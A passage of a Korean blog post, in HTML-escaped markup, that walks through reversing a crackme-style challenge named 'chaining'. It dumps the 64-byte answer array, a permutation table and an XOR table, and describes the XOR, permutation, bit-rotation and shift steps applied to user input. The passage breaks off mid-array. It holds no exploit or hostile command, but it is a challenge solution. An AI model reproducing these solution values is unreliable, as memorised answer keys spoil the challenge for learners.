&lt;p&gt;스택에 sub_193c가 먼저 나와 있고, sub_19a3이 다음으로 나와 있는 것, 그리고 후자에서 good:) 를 출력해 주는 것을 감안하면 저 if 문 안으로 들어가지 않고 return 되었을 때 good:) 가 출력될 것을 추측할 수 있다.&lt;/p&gt;

&lt;p&gt;즉, byte_6060이 진짜 정답이 들어 있는 배열일 것이고, 64 바이트일 것이다.&lt;/p&gt;

&lt;p&gt;해당 배열의 내용은 다음과 같다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/chaining/Untitled%2049.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;mi&quot;&gt;27&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;63&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;72&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;73&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;43&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;F&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;F&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;43&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;E&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;F0&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;33&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;F3&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;E&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;07&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;A&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;33&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;E5&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;C&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DB&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;F&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;C9&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;11&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DE&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;62&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;42&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;18&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FE&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;B&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;E&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;15&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;A&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BB&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;96&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DB&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;E&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;23&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FD&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;90&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;B&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;E&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;A&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;89&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;47&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BD&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;E&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;88&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;D6&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;F9&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;B9&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;50&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;76&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;E1&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;C&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;F&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;89&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;54&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;D&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;B1&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;F1&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;A6&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;B&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;A&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;C&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;그럼 이제 절반 왔다! 우리는 사용자의 입력값이 어떤 변환 과정을 거치는지 알고, 그 변환 결과가 어떤 값이 되어야 하는지도 알고 있다. 그럼 이제 복호화 프로그램을 만들어 보자.&lt;/p&gt;

&lt;h1 id=&quot;3-복호화-프로그램-만들기&quot;&gt;3. 복호화 프로그램 만들기&lt;/h1&gt;

&lt;p&gt;앞선 과정을 다시 정리해 보자.&lt;/p&gt;

&lt;h2 id=&quot;31-sub_1215-does-xor-every-char-in-user-input-with-0x44&quot;&gt;3.1. sub_1215: does xor every char in user input with 0x44&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sub_1215(0x40, char *buf, 0x44)&lt;/code&gt;&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/posts/chaining/Untitled%2022.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;32-sub_1268-make-a-permutation-table&quot;&gt;3.2. sub_1268: make a permutation table&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sub_1268(0xe5119cf0, 0xddc615f0, 0x7851327a, 0x84a7815a, char *buf)&lt;/code&gt;&lt;/p&gt;

    &lt;p&gt;table: (명령어: dump memory ./permutation_table.txt 0x55555555a900 0x55555555a940)&lt;/p&gt;

    &lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;mo&quot;&gt;07&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;09&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;E&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;01&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;C&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;08&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;03&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;06&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;04&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;A&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;02&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;B&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;05&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;F&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;D&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;03&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;01&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;04&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;A&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;02&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;06&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;B&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;08&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;F&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;09&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;C&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;05&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;E&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;D&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;07&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;A&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;E&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;D&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;04&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;05&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;06&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;08&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;03&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;B&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;F&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;09&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;01&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;C&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;02&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;07&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;07&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;01&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;09&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;A&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;05&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;06&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;F&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;03&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;D&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;02&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;E&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;04&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;C&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;08&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;B&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;33-sub_1447-does-permutation-on-user-inputbuf&quot;&gt;3.3. sub_1447: Does Permutation on user input(buf)&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sub_1447(char *buf, int8 *table)&lt;/code&gt;&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/posts/chaining/Untitled%2029.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;34-sub_14ed--table의-1-byte를-buf의-1byte와-xor해-buf에-저장한다&quot;&gt;3.4. sub_14ed:  table의 1 byte를 buf의 1byte와 xor해 buf에 저장한다.&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sub_14ed(char *table2, char *buf)&lt;/code&gt;&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/posts/chaining/Untitled%2038.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;사용된 테이블:&lt;/p&gt;

    &lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;n&quot;&gt;E9&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;A&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;D&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;D&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;C&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;45&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;61&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;C&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;F6&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;47&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;15&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;E&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;C8&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;25&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;A&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;E5&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CA&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;53&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;18&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;07&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;F4&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;C3&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FB&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;C&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AC&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;34&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;31&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;38&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;D3&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;A&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;D5&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;22&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;B&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;C4&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;F5&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;F8&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;19&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ED&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;D0&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;42&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;F2&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;F8&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;A&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;B&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;37&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;B4&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;68&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;58&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;92&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BB&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;47&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;E6&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;A5&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;C&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;D&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;EC&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;E&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;A&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FA&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;F&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;35-sub_15bb-buf에서-4k-4k1-4k2-4k3-k0-1---15-번째의-원소별로-다른-알고리즘을-적용해-변환한다-즉-substitution-연산을-한다&quot;&gt;3.5. sub_15bb: buf에서 4k, 4k+1, 4k+2, 4k+3 (k=0, 1, … , 15) 번째의 원소별로 다른 알고리즘을 적용해 변환한다. 즉 substitution 연산을 한다.&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sub_15bb(char *buf)&lt;/code&gt;&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/posts/chaining/Untitled%2040.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;351-sub_1545-우로-n비트-순환-시프트-연산을-수행하는-함수다-for-4k-4k2&quot;&gt;3.5.1. sub_1545: 우로 n비트 순환 시프트 연산을 수행하는 함수다. (for 4k, 4k+2)&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sub_1545(char c, int n)&lt;/code&gt;&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/posts/chaining/Untitled%2041.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;352-sub_1580-좌로-n비트-순환-시프트-연산을-수행하는-함수다-for-4k1-4k3&quot;&gt;3.5.2. sub_1580: 좌로 n비트 순환 시프트 연산을 수행하는 함수다. (for 4k+1, 4k+3)&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sub_1580(char c, int n)&lt;/code&gt;&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/posts/chaining/Untitled%2050.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;36-sub_16e0-카이사르-치환-암호화&quot;&gt;3.6. sub_16e0: 카이사르 치환 암호화&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sub_16e0(char *buf, const int x(0x11))&lt;/code&gt;&lt;/p&gt;

    &lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;n&quot;&gt;sub_16e0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// x==0x11&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  	&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;63&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  	&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  		&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x11&lt;/span&gt;
  	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;37-sub_172e&quot;&gt;3.7. sub_172e&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sub_172e(char *buf)&lt;/code&gt;&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/posts/chaining/Untitled%2046.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;38-sub_193c-여긴-정답-배열과-input-배열을-대조하는-루틴이다&quot;&gt;3.8. sub_193c: 여긴 정답 배열과 input 배열을 대조하는 루틴이다.&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;정답 배열&lt;/p&gt;

    &lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;mi&quot;&gt;27&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;63&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;72&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;73&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;43&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;F&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;F&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;43&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;E&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;F0&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;33&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;F3&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;E&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;07&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;A&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;33&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;E5&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;C&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DB&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;F&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;C9&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;11&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DE&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;62&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;42&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;18&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FE&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;B&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;E&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;15&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;A&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BB&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;96&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DB&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;E&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;23&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FD&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;90&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt; &lt;span 